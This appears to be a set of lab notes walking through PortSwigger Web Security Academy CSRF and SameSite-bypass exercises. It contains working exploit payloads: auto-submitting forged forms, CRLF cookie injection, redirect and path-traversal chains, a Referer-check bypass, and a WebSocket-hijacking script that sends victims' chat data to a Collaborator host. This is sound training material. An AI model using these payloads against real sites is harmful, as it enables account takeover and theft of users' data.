### CSRF vulnerability with no defenses

After you log in, you will find a "Update email" button, that sends a request to change your email for a new one.
Once you find this request in Burp, you will see it has no CSRF protecion. So, right-click on the request > engagement tools > Generate CSRF PoC

You can now paste this PoC in the exploit server, and then deliver it to the victim.

---
### CSRF where token validation depends on request method

Find the POST change-email request. It's validating the csrf token value. But if you change the request method to a GET, and delete the CSRF, you can log in without validate that. 

So, right click, create CSRF PoC and deliver exploit to the victim. 

---
### CSRF where token validation depends on token being present

Find the POST change-email request. See it's not validating if "csrf" token is present. So delete it. Craft the payload as the previous exercise. Send it to victim.

---
### CSRF where token is not tied to user session

It's validating the csrf token to be valid, but as it's not tied to a user, you can use your own token to do actions in behalf of another user.

---
### CSRF where token is tied to non-session cookie

If you remove the `session` cookie, the session logs out. But if you modify the `csrfKey` it responds with an error. This may indicate this value is not properly tied to the user.

If you use the csrfKey and csrf parameter from the seconds account, in the first one, it works. 

When you do a search, you can see the queryString like this: `/?search=test`

So, let's craft our payload: 
```text
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0200a903be584f83ee73d5007700ca.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="iKBV1pK80FEtDqBnfhqGeJR1CXflv4RJ" />
      <input type="submit" value="Submit request" />
    </form>
    
<!-- This will go to my controled queryString and set the cookie values I decide -->
    <img src="https://0a0200a903be584f83ee73d5007700ca.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=9tKFFfcILZyyNA6wfmbacF0vqOawqkyO%3b%20SameSite=None" onerror="document.forms[0].submit()">

  </body>
</html>
```

---
### CSRF where token is duplicated in cookie

It's just validating the csrf token is the same in the body parameter and the cookie. So, change both at the same time, and its valid. 

Generate a CSRF PoC, and use this img src instead of the script:
```text
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0a00ef049ca07382e0ec3e009f00fe.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="admin&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="7yovoJL8jFq0JyC0m5XkKmM8RkYVY5AA" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a0a00ef049ca07382e0ec3e009f00fe.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=7yovoJL8jFq0JyC0m5XkKmM8RkYVY5AA%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>

```

Note the "csrf" in the body is equal to the Cookie `csrf`

---
### SameSite Lax bypass via method override

If you try to change your email, can see it's not sending or using any CSRF token. The only value is the cookie, marked as `SameSite: None`. We can see the response to the login request is setting the cookie, without any SameSite flag, so the browser will use the browser's default, which is `Lax` 

> This means the session cookie will be sent in cross-site `GET` requests, as long as they involve a top-level navigation.

Change the request method, and you'll get "Method not allowed" as response. Add this to the query string: `&_method=POST` and you can get the 302 response. 

Once validated this, you can create the malicious payload for the exploit server: 
```text
<script>
	document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST"; 
</script>
```

---
### SameSite Strict bypass via client-side redirect

In the login, we can see the cookie is flagged as `SameSite: Strict`. 

> This prevents the browser from including these cookies in cross-site requests.

Try to submit a comment, and you'll see you are redirected to `/post/comment/confirmation?postId=x`, and then back at the post page `/post/1`

This redirection is handled client-side using this JavaScript file: `/resources/js/commentConfirmationRedirect.js`

This JS uses the postId parameter to dynamically construct the path for the redirect: 
![[Pasted image 20240717190448.png]]

Copy the `GET /post/comment/confirmation?postId=x`, paste it on the browser, and replace the 1 with "foo". It will try to redirect you to /post/foo

Try to inject a path traversal like `../../my-account` . The browser normalizes the URL and takes you to the account page. 

This means you can get a GET request to the parameter in the postId

Send the "change-email" request to the repeater, change the request method, and verify **you can still performing this action with a different method**

So this will be your payload: 
```text
<script> 
	document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1"; 
</script>
```

---
### SameSite Strict bypass via sibling domain

Go to the live chat feature and send a few messages. In Burp find the WebSocket handshake request. This should be the most recent `GET /chat` request.
This doesn't contain any unpredictable tokens, so may be vulnerable to CSWSH if you can bypass any SameSite cookie restrictions.
  
```js
<script> var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>
```    

In Burp, study the proxy history and notice that responses to requests for resources like script and image files contain an `Access-Control-Allow-Origin` header, which reveals a sibling domain at `cms-YOUR-LAB-ID.web-security-academy.net`.

Visit this new URL to discover an additional login form. Observe that the "username" field is vulnerable to XSS. 

Send the `POST /login` request containing the XSS payload to Burp Repeater.

In Burp Repeater, right-click on the request and select **Change request method** to convert the method to `GET`. Confirm that it still receives the same response.
URL encode the entire script.

Go back to the exploit server and create this script:
`<script> document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything"; </script>`

If it works, send it to victim.

---
### SameSite Lax bypass via cookie refresh

Log in, and study the change email functionality and see it doesn't contain any token.

Also notice the response to the GET /oauth-callback?code= doesn't explicitly specify any SameSite restrictions. The browser will default it with `Lax`

If you visit the /social-login initiates the OAuth flow

Final payload:
```html
`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@portswigger.net"> </form> <p>Click anywhere on the page</p> <script> window.onclick = () => { window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); } function changeEmail() { document.forms[0].submit(); } </script>`
```

---
### CSRF where Referer validation depends on header being present

You can update your email, and remove entirely the "referrer" header. So, right click > create CSRF PoC , and add the line `<meta name='referrer' content='no-referrer'>`

Change the email so it doesn't match your own. Store, and send to victim.

---
### CSRF with broken Referer validation

It's not properly validating the Referer header, so you can craft this exploit:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2f006104f7d01680a45d8900e4003e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="lala&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0a2f006104f7d01680a45d8900e4003e.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

And add the header: 
`Referrer-Policy: unsafe-url`

Wait a few seconds... 

---
